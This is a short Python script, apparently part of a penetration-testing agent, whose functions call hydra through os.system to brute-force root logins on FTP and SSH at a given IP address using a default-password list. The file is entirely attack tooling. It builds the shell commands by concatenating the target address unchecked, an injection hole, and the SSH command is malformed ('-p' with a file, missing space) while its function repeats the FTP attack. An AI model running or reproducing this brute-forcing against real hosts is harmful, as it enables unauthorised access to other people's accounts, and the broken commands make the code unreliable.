# -*- coding: UTF-8 -*-

#!/usr/bin/python
# 
# Filename:  AccountBruteforce.py 
#
# Version: 1.0.1
#
# 
# 
#  Descripcion:  
# 
# AccountBruteforce.py  contiene el acceso a diferentes diccionarios de usuarios y contraseñas
# por defecto para los diferentes servicios escaneados en una fase previa.
# 
#   
#
# Instrucciones
# 
# Para la ejecución del menú principal y empezar a la configuración del agente
# Es necesario ejecutar el archivo llamado AccountBruteforce.py  como se muestra:
# Ejemplo:  
#
#   $ ./AccountBruteforce.py 

from colorama import init, Fore, Back, Style
import os, sys, datetime,time,importlib,ftplib

def FTPBruteforce(direccion_IP):
    print("Intentando acceder al FTP")
    orden="hydra -l root -P passwd.dat ftp://"
    os.system(orden+direccion_IP)

    

def sshBruteforce(direccion_IP):
    print("Intentando acceder vía Secure Shell")
    orden="hydra -l root -p passwd.dat"+direccion_IP + " -t 4 ssh"
    os.system(orden)
    print("Intentando acceder al FTP")
    orden="hydra -l root -P passwd.dat ftp://"
    os.system(orden+direccion_IP)
    